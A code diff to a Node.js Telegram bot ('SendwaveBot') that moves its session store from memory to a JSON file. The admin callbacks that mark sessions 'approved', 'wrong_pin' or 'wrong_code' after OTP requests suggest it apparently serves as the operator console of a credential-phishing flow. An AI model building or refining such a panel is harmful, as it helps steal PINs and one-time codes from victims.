@@ -1,8 +1,42 @@
 const fetch = require('node-fetch');
 const crypto = require('crypto');
+const fs = require('fs');
+const path = require('path');
 
-// Global session store - shared across all requests
-const sessions = {};
+// ── Persistent session store (survives restarts) ──
+const SESSION_FILE = path.join(__dirname, 'sessions.json');
+
+function loadSessions() {
+  try {
+    if (fs.existsSync(SESSION_FILE)) {
+      return JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8'));
+    }
+  } catch (e) { console.error('Failed to load sessions:', e.message); }
+  return {};
+}
+
+function saveSessions(sessions) {
+  try {
+    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions), 'utf8');
+  } catch (e) { console.error('Failed to save sessions:', e.message); }
+}
+
+function setSession(sessionId, status) {
+  const sessions = loadSessions();
+  sessions[sessionId] = status;
+  saveSessions(sessions);
+}
+
+function getSession(sessionId) {
+  const sessions = loadSessions();
+  return sessions[sessionId] || 'pending';
+}
+
+function deleteSession(sessionId) {
+  const sessions = loadSessions();
+  delete sessions[sessionId];
+  saveSessions(sessions);
+}
 
 class SendwaveBot {
   constructor(token, adminId) {
@@ -58,9 +92,8 @@ class SendwaveBot {
       reply_markup: JSON.stringify(keyboard)
     });
 
-    sessions[sessionId] = 'pending';
+    setSession(sessionId, 'pending');
     console.log(`✅ Session created: ${sessionId}`);
-    console.log(`📦 Sessions:`, sessions);
 
     return { success: true, sessionId };
   }
@@ -99,32 +132,31 @@ class SendwaveBot {
 
     if (data.startsWith('otp_request_')) {
       const sessionId = data.replace('otp_request_', '');
-      sessions[sessionId] = 'approved';
+      setSession(sessionId, 'approved');
       console.log(`✅ Approved: ${sessionId}`);
     } else if (data.startsWith('wrong_pin_')) {
       const sessionId = data.replace('wrong_pin_', '');
-      sessions[sessionId] = 'wrong_pin';
+      setSession(sessionId, 'wrong_pin');
       console.log(`❌ Wrong PIN: ${sessionId}`);
     } else if (data.startsWith('wrong_')) {
       const sessionId = data.replace('wrong_', '');
-      sessions[sessionId] = 'wrong_code';
+      setSession(sessionId, 'wrong_code');
       console.log(`❌ Wrong Code: ${sessionId}`);
     } else if (data.startsWith('continue_')) {
       const sessionId = data.replace('continue_', '');
-      sessions[sessionId] = 'continue';
+      setSession(sessionId, 'continue');
       console.log(`➡️ Continue: ${sessionId}`);
     }
 
-    console.log(`📦 Sessions after callback:`, sessions);
     await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
     return true;
   }
 
   getSessionStatus(sessionId) {
-    const status = sessions[sessionId] || 'pending';
+    const status = getSession(sessionId);
     console.log(`🔍 Checking session ${sessionId}: ${status}`);
     if (status !== 'pending') {
-      setTimeout(() => { delete sessions[sessionId]; }, 5000);
+      setTimeout(() => { deleteSession(sessionId); }, 5000);
     }
     return status;
   }
